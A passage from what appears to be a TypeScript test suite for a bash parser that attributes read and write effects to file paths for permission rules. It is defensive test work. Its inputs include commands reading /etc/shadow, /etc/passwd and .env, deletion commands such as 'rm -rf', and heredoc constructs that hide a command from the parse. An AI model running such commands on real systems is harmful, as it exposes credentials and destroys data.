      expect(external.some((v) => v.toLowerCase().includes("work"))).toBe(true);
    });

    it("attributes nothing to the seeded workdir itself", async () => {
      const program = await BashProgram.parse("echo hi", normalizer, {
        workdir: "/etc",
      });
      const workdirEntry = program
        .externalAccesses()
        .find(({ path }) => path.value() === "/etc");
      expect(workdirEntry?.effect).toEqual(UNPROVEN_EFFECT);
    });
  });

  describe("effect attribution (#807)", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("carries a core word's read onto its external access", async () => {
      const program = await BashProgram.parse("cat /etc/hosts", normalizer);
      expect(
        program.externalAccesses().map(({ path, effect }) => ({
          path: path.value(),
          effect,
        })),
      ).toEqual([
        { path: "/etc/hosts", effect: { effect: "read", source: "core" } },
      ]);
    });

    it("carries a shell no-op's read onto its external access", async () => {
      const program = await BashProgram.parse("true /etc/hosts", normalizer);
      expect(
        program.externalAccesses().map(({ path, effect }) => ({
          path: path.value(),
          effect,
        })),
      ).toEqual([
        { path: "/etc/hosts", effect: { effect: "read", source: "core" } },
      ]);
    });

    it("carries a core word's read onto its rule candidate", async () => {
      const program = await BashProgram.parse("cat /etc/hosts", normalizer);
      expect(
        program.pathRuleCandidates().map(({ token, effect }) => ({
          token,
          effect,
        })),
      ).toEqual([
        { token: "/etc/hosts", effect: { effect: "read", source: "core" } },
      ]);
    });

    it("carries a redirect's write onto its destination", async () => {
      const program = await BashProgram.parse(
        "cat /etc/hosts > /tmp/out.txt",
        normalizer,
      );
      expect(
        program.pathRuleCandidates().map(({ token, effect }) => ({
          token,
          effect,
        })),
      ).toEqual([
        { token: "/etc/hosts", effect: { effect: "read", source: "core" } },
        {
          token: "/tmp/out.txt",
          effect: { effect: "write", source: "syntax" },
        },
      ]);
    });

    describe("a word after a redirect's target", () => {
      /** The rule candidates of `command`, as token and effect. */
      async function candidateEffects(command: string) {
        const program = await BashProgram.parse(command, normalizer);
        return program
          .pathRuleCandidates()
          .map(({ token, effect }) => ({ token, effect }));
      }

      it("carries the command's read, not the operator's write", async () => {
        await expect(
          candidateEffects("grep pat 2>/dev/null /etc/hosts"),
        ).resolves.toEqual([
          { token: "/dev/null", effect: { effect: "write", source: "syntax" } },
          { token: "/etc/hosts", effect: { effect: "read", source: "core" } },
        ]);
      });

      it("carries the command's read after a close operator", async () => {
        await expect(candidateEffects("cat >&- /etc/hosts")).resolves.toEqual([
          { token: "/etc/hosts", effect: { effect: "read", source: "core" } },
        ]);
      });

      it("reaches the command's retraction guards", async () => {
        const program = await BashProgram.parse(
          "find /tmp/x 2>/dev/null -delete",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path, effect }) => ({
            path: path.value(),
            effect,
          })),
        ).toEqual([
          {
            path: "/tmp/x",
            effect: { effect: "unproven", source: "retracted" },
          },
        ]);
      });
    });

    it("proves nothing for a token a non-core command owns", async () => {
      const program = await BashProgram.parse("rm -rf /tmp/gone", normalizer);
      const candidate = program
        .pathRuleCandidates()
        .find(({ token }) => token === "/tmp/gone");
      expect(candidate?.effect).toEqual(UNPROVEN_EFFECT);
    });

    describe("two attributions of one resolved path", () => {
      it("folds to a single external access", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts > /etc/hosts",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(1);
      });

      it("falls to unproven when the two proofs disagree", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts > /etc/hosts",
          normalizer,
        );
        expect(program.externalAccesses()[0].effect).toEqual(UNPROVEN_EFFECT);
        expect(program.pathRuleCandidates()).toHaveLength(1);
        expect(program.pathRuleCandidates()[0].effect).toEqual(UNPROVEN_EFFECT);
      });

      it("keeps the effect when the two proofs agree", async () => {
        const program = await BashProgram.parse(
          "cat /etc/hosts && head /etc/hosts",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(1);
        expect(program.externalAccesses()[0].effect).toEqual({
          effect: "read",
          source: "core",
        });
      });
    });
  });

  describe("path operands of a command the parse dropped (#875)", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("projects the dropped command's operand as a rule candidate", async () => {
      // Before the salvage this reached neither path surface at all, so ADR
      // 0009's completeness contract was broken rather than residual.
      const program = await BashProgram.parse(
        "cat <<'MSG' 2>&1 | cat /etc/shadow\nmsg\nMSG",
        normalizer,
      );
      expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
        "/etc/shadow",
      ]);
    });

    it("flags the dropped command's operand as an external access", async () => {
      const program = await BashProgram.parse(
        "cat <<'MSG' 2>&1 | cat /etc/shadow\nmsg\nMSG",
        normalizer,
      );
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toEqual(["/etc/shadow"]);
    });

    it("carries the effect the dropped command's own word proves", async () => {
      const program = await BashProgram.parse(
        "cat <<'MSG' 2>&1 | cat /etc/shadow\nmsg\nMSG",
        normalizer,
      );
      expect(program.pathRuleCandidates()[0].effect).toEqual({
        effect: "read",
        source: "core",
      });
    });

    it("folds a path the primary parse already named", async () => {
      // The salvaged candidates join the primary ones before projection, so
      // the existing dedup sees both and the prompt shows one entry.
      const program = await BashProgram.parse(
        "cat /etc/hosts <<'MSG' 2>&1 | cat /etc/hosts\nmsg\nMSG",
        normalizer,
      );
      expect(program.externalAccesses()).toHaveLength(1);
      expect(program.pathRuleCandidates()).toHaveLength(1);
    });

    it("keeps a relative operand literal rather than resolving it against the cwd", async () => {
      // The salvaged fragment carries no record of the `cd` in force where it
      // sat, so resolving `../secret` against the session cwd would name
      // `/projects/secret` — a different file than the one that runs, which a
      // rule for that other path could then allow. #393's unknown base
      // declines the claim instead and keeps the token as typed.
      const program = await BashProgram.parse(
        "cd /outside && cat <<'MSG' 2>&1 | cat ../secret\nmsg\nMSG",
        normalizer,
      );
      const candidate = program
        .pathRuleCandidates()
        .find(({ token }) => token === "../secret");
      expect(candidate?.path.matchValues()).toEqual(["../secret"]);
    });

    it("projects a redirect written after a heredoc the grammar cannot parse as a write", async () => {
      const program = await BashProgram.parse(
        "cat <<EOF arg > /tmp/o\nb\nEOF",
        normalizer,
      );
      expect(
        program
          .externalAccesses()
          .map(({ path, effect }) => [path.value(), effect]),
      ).toEqual([["/tmp/o", { effect: "write", source: "syntax" }]]);
    });

    it("leaves a cleanly-parsed command's slices untouched", async () => {
      const program = await BashProgram.parse(
        "cat .env /etc/hosts",
        normalizer,
      );
      expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
        ".env",
        "/etc/hosts",
      ]);
    });
  });

  describe("an interpreter's inline script (#863)", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    /** The issue's reported command, abbreviated but structurally intact. */
    const reportedCommand = [
      'node -e "',
      "// check which packages are installed",
      "const fs = require('fs');",
      "for (const pkg of ['pkg-a','pkg-b']) {",
      "  try { console.log(pkg, require.resolve(pkg + '/package.json')); } catch { console.log(pkg, '(not installed)'); }",
      "}",
      '"',
    ].join("\n");

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("raises no external access for the reported command", async () => {
      const program = await BashProgram.parse(reportedCommand, normalizer);
      expect(program.externalAccesses()).toEqual([]);
    });

    it("offers no rule candidate for the reported command", async () => {
      // The issue reports only the external_directory ask, but the same token
      // reached the broader `path` surface too, because it contains `/`.
      const program = await BashProgram.parse(reportedCommand, normalizer);
      expect(program.pathRuleCandidates()).toEqual([]);
    });

    it("still enumerates the invocation for the bash surface", async () => {
      // The command enumerator is a separate walker; `bash:` rules govern the
      // interpreter invocation exactly as before.
      const program = await BashProgram.parse('node -e "// x"', normalizer);
      expect(program.commands()).toEqual([{ text: 'node -e "// x"' }]);
    });

    it("still projects a script-hosted command's operand", async () => {
      const program = await BashProgram.parse(
        'node -e "$(cat /etc/shadow)"',
        normalizer,
      );
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toEqual(["/etc/shadow"]);
    });

    it("still flags a script file's operand outside the tree", async () => {
      const program = await BashProgram.parse(
        "node build.js /etc/passwd",
        normalizer,
      );
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toEqual(["/etc/passwd"]);
    });
  });

  describe("parseSync", () => {
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      "/projects/my-app",
    );

    beforeEach(() => {
      resetWarmBashParser();
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });
    afterEach(() => {
      resetWarmBashParser();
    });

    it("answers null while the parser is cold", () => {
      expect(BashProgram.parseSync("echo hi", normalizer)).toBeNull();
    });

    describe("once warm, builds the program parse builds", () => {
      beforeEach(async () => {
        await warmBashParser();
      });

      it.each([
        ["a chain with a cd", "cd /tmp && rm a/x; cat ../secret", undefined],
        [
          "a command the parse could not resolve",
          "> f <<'M' 2>&1 | rm -rf /tmp/x",
          undefined,
        ],
        ["a seeded workdir", "cat notes.txt ../up.txt", "/elsewhere"],
      ])("%s", async (_label, command, workdir) => {
        const options = workdir === undefined ? undefined : { workdir };
        const expected = await BashProgram.parse(command, normalizer, options);
        const actual = BashProgram.parseSync(command, normalizer, options);
        if (actual === null) throw new Error("parser not warm");
        expect(actual.commandText()).toBe(command);
        expect(actual.commands()).toEqual(expected.commands());
        expect(actual.externalAccesses()).toEqual(expected.externalAccesses());
        expect(actual.pathRuleCandidates()).toEqual(
          expected.pathRuleCandidates(),
        );
      });
    });
  });
});
